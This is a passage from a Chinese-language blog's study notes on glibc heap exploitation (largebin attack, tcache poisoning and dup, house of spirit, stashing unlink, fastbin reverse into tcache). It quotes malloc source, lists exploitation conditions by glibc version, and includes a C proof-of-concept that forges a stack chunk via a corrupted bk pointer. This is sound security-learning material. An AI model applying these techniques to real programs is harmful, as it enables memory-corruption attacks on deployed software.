class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">         victim_index = largebin_index (size);</span><br><span class="line">         bck = bin_at (av, victim_index);</span><br><span class="line">         fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">         <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">             size |= PREV_INUSE;</span><br><span class="line">             <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">             assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">             <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">   &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">               &#123;</span><br><span class="line">                 fwd = bck;</span><br><span class="line">                 bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                 victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                 victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                 fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               &#123;</span><br><span class="line">                 assert (chunk_main_arena (fwd));</span><br><span class="line">                 <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                   &#123;</span><br><span class="line">                     fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">assert (chunk_main_arena (fwd));</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">                 <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">== (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                   <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                   fwd = fwd-&gt;fd;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                       malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">                     fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br><span class="line">                 bck = fwd-&gt;bk;</span><br><span class="line">                 <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                   malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">       &#125;</span><br><span class="line">     mark_bin (av, victim_index);</span><br><span class="line">     victim-&gt;bk = bck;</span><br><span class="line">     victim-&gt;fd = fwd;</span><br><span class="line">     fwd-&gt;bk = victim;</span><br><span class="line">     bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>largebin attack就是出现在这个提取chunk的过程中</p><p>由于两者大小相同的时候只会使用如下的方法插入，所以此时无法利用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long) size</span><br><span class="line">              == (unsigned long) chunksize_nomask (fwd))</span><br><span class="line">                        /* Always insert in the second position.  */</span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br></pre></td></tr></table></figure><p>两种利用方法</p><ul><li><strong>当unsorted chunk的size小于largebin链上最小的chunk时</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = bck;</span><br><span class="line">              bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">              victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>如果修改nextsize链上最大的chunk的bk_nextsize字段为addr,那么<code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code>就会将addr+0x20的位置写上victim</p><ul><li><strong>当unsorted chunk的size大于largebin链上最小的chunk时</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">             <span class="keyword">else</span></span><br><span class="line">               &#123;</span><br><span class="line">                 assert (chunk_main_arena (fwd));</span><br><span class="line">                 <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                   &#123;</span><br><span class="line">                     fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">assert (chunk_main_arena (fwd));</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">                 <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">== (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))<span class="comment">//!!no</span></span><br><span class="line">                   <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                   fwd = fwd-&gt;fd;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                       malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">                     fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br><span class="line">                 bck = fwd-&gt;bk;</span><br><span class="line">                 <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                   malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">               &#125;</span><br></pre></td></tr></table></figure><p>这两个在2.30中新增加的检查使得这种利用方法不再可行</p><p>但在此之前</p><ol><li>如果修改第一个小于unsorted chunk的size的chunk的bk_nextsize字段为addr,<code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code>会使得addr+0x20写为victim</li><li>如果修改第一个小于unsorted chunk的size的chunk的bk字段为addr,<code>bck = fwd-&gt;bk;</code>与之后的<code>bck-&gt;fd = victim;</code>会使得addr+0x10写为victim</li></ol><h1 id="tcache-attack"><a href="#tcache-attack" class="headerlink" title="tcache attack"></a>tcache attack</h1><p>tcache使得性能提高的同时,安全性大幅下降,操作优先级高且检查并不严谨,利用更为简单</p><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><h3 id="概要-4"><a href="#概要-4" class="headerlink" title="概要"></a>概要</h3><p><strong>简介:</strong> 通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。任意地址作为chunk操作</p><p><strong>利用条件:</strong>能劫持chunk的next字段</p><p><strong>利用效果:</strong>任意地址分配chunk</p><p><strong>有效版本:</strong>ALL</p><p><strong>限制:</strong>2.32及以上版本tcachebin加密,写next字段需要能够泄露堆地址,并进行一些额外处理</p><h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h2><h3 id="概要-5"><a href="#概要-5" class="headerlink" title="概要"></a>概要</h3><p><strong>简介:</strong> 类似 <code>fastbin dup</code>，不过利用的是 <code>tcache_put()</code> 的不严谨,因为没有任何检查，所以我们可以对同一个 chunk 多次 free，可以连续释放同一个chunk,造成 cycliced list。也就是造成一个chunk可以被无数次取出利用</p><p><strong>利用条件:</strong>能多次free同一chunk</p><p><strong>利用效果:</strong>获得多个指向同一chunk的指针</p><p><strong>有效版本:</strong>2.29以前,2.29tcache引入key验证机制</p><p><strong>技巧:</strong>2.29及以后虽然tcache引入key验证机制,但如果能<strong>破坏chunk的key字段,就能绕过</strong></p><h2 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h2><h3 id="概要-6"><a href="#概要-6" class="headerlink" title="概要"></a>概要</h3><p><strong>简介:</strong> 在开启tcache情况下,堆上第一个chunk就是结构体tcache_perthread_struct,大小为0x290,该技术就是通过tcache posioning将tcache链中的某个chunk指向tcache_perthread_struct本身,直接修改tcache_perthread_struct进行攻击</p><p><strong>利用条件:</strong>能劫持chunk的next字段</p><p><strong>利用效果:</strong>控制tcache_perthread_struct结构体</p><p><strong>有效版本:</strong>同tcache posioning</p><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h2><h3 id="概要-7"><a href="#概要-7" class="headerlink" title="概要"></a>概要</h3><p><strong>简介:</strong> 与fastbin的house of spirit一个原理,因为没有检查反而更简单,不需要伪造nextsize等,只要size字段符合tcache标准即可</p><p><strong>利用条件:</strong>能free指定地址</p><p><strong>利用效果:</strong>获得一个任意地址的chunk</p><p><strong>有效版本:</strong>ALL</p><p>fakechunk须满足的条件</p><ol><li>地址对齐</li><li>ISMMAP 位不能为 1</li><li>大小对齐,大于MINSIZE小于system_mem,处在tcache范围内</li></ol><h2 id="smallbin-unlink"><a href="#smallbin-unlink" class="headerlink" title="smallbin unlink"></a>smallbin unlink</h2><h3 id="概要-8"><a href="#概要-8" class="headerlink" title="概要"></a>概要</h3><p><strong>简介:</strong> 在smallbin中取出chunk后,如果在该 smallbin 链中还有剩余的空闲块的时候，会同时将同大小的其他空闲块，放入 tcache 中，此时也会出现解链操作，但相比于 unlink 宏，缺少了链完整性校验。</p><p><strong>利用条件:</strong>能劫持chunk的bk字段</p><p><strong>利用效果:</strong></p><p><strong>有效版本:</strong>ALL</p><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line"> <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">   &#123;</span><br><span class="line">     mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">     <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">           &#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>修改victim的bk字段为目标地址,两个效果</p><ol><li>使得包含目标地址的chunk被放入tcache</li><li>目标地址的fd字段被写为该smallbin头</li></ol><p><strong>注意:</strong></p><p>其实最好需要控制tcache已有的数量尽量多(理论最好是6,这样能够在放入目标chunk后就退出循环,但实际上不行<strong>因为第一个chunk的完整性检查过不了</strong>,因此实际上最好为5)</p><p>否则可能会访问到错误地址,从而报错</p><p>但是tcache中有数量的话则申请的时候会直接从tcache中取出</p><p>因此除非能使目标地址的bk字段为其自身,不然都比较难使用,毕竟要一直保证每一次的bk字段都存放一个可写地址并不轻松</p><h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h2><h3 id="概要-9"><a href="#概要-9" class="headerlink" title="概要"></a>概要</h3><p><strong>简介:</strong> 利用smallbin中的chunk转移到tcache的漏洞</p><p><strong>利用条件:</strong>能劫持chunk的bk字段</p><p><strong>利用效果:</strong></p><p><strong>有效版本:</strong>ALL</p><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这种攻击利用的是 tcache bin 有剩余 (数量小于 <code>TCACHE_MAX_BINS</code> ) 时，同大小的 small bin 会放进 tcache 中</p><p> 这种情况可以用 <code>calloc</code> 分配同大小堆块触发，因为 <code>calloc</code> 分配堆块时不从 tcache bin 中选取。</p><p>在获取到一个 <code>smallbin</code> 中的一个 chunk 后会如果 tcache 仍有足够空闲位置，会将剩余的 small bin 链入 tcache ，在这个过程中只对第一个 bin 进行了完整性检查，<strong>后面的堆块的检查缺失</strong>。</p><p>当攻击者可以写一个 small bin 的 bk 指针时，其可以在任意地址上写一个 libc 地址 (类似 <code>unsorted bin attack</code> 的效果)。构造得当的情况下也可以分配 fake chunk 到任意地址。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>同时还要在 <code>fake_chunk_addr-&gt;bk</code> 处提前写一个可写地址 <code>writable_addr</code> 。调用 <code>calloc(size-0x10)</code> 的时候会返回给用户 chunk0 (这是因为 smallbin 的 <code>FIFO</code> 分配机制)，假设 <code>tcache[sz]</code> 中有 5 个空闲堆块，则有足够的位置容纳 <code>chunk1</code> 以及 <code>fake_chunk</code> 。在源码的检查中，只对第一个 chunk 的链表完整性做了检测 <code>__glibc_unlikely (bck-&gt;fd != victim)</code> ，后续堆块在放入过程中并没有检测。</p><p>因为 tcache 的分配机制是 <code>LIFO</code> ，所以位于 <code>fake_chunk-&gt;bk</code> 指针处的 <code>fake_chunk</code> 在链入 tcache 的时候反而会放到链表表头。在下一次调用 <code>malloc(sz-0x10)</code> 时会返回 <code>fake_chunk+0x10</code> 给用户，同时，由于 <code>bin-&gt;bk = bck;bck-&gt;fd = bin;</code> 的 unlink 操作，会使得 <code>writable_addr+0x10</code> 处被写入一个 libc 地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 tcache</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">//&gt;0x90</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此利用时,最好保证</p><ol><li>tcache的数量最好是5</li><li>smallbin链上至少要有两个正常的chunk以绕过第一个chunk的完整性检查</li><li>目标地址的fd字段要可写,bk字段应该指向一个可写的地方,确保<code>bck-&gt;fd = bin;</code>不报错</li></ol><h2 id="Fastbin-reverse-into-tcache"><a href="#Fastbin-reverse-into-tcache" class="headerlink" title="Fastbin reverse into tcache"></a>Fastbin reverse into tcache</h2><h3 id="概要-10"><a href="#概要-10" class="headerlink" title="概要"></a>概要</h3><p><strong>简介:</strong> 利用fastbin中的chunk转移到tcache的漏洞</p><p><strong>利用条件:</strong>能劫持chunk的bk字段</p><p><strong>利用效果:</strong></p><p><strong>有效版本:</strong>ALL</p><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p>原理于上述两个利用差不多,都是利用chunk转移到未满tcache链上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">     <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">     <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = REVEAL_PTR (tc_victim-&gt;fd);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到仅仅是检测了chunk的地址是否对齐,并没有对size进行检查</p><p>那么只要能够控制fast chunk的fd字段就能够做到任意写</p><p>但因为目标地址处的内容不完全可控</p><p>所以控制流程结束最稳妥的方式是通过将tcache加满,即加入fake chunk之后tcache刚好填满</p><p>个人觉得不是很实用,都能够做到控制fastbin的fd字段了,不如干脆直接控制tcachebin的next字段</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> 堆 </tag>
            
            <tag> 堆利用 </tag>
            
            <tag> fastbin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用-2</title>
      <link href="/posts/61137/"/>
      <url>/posts/61137/</url>
      
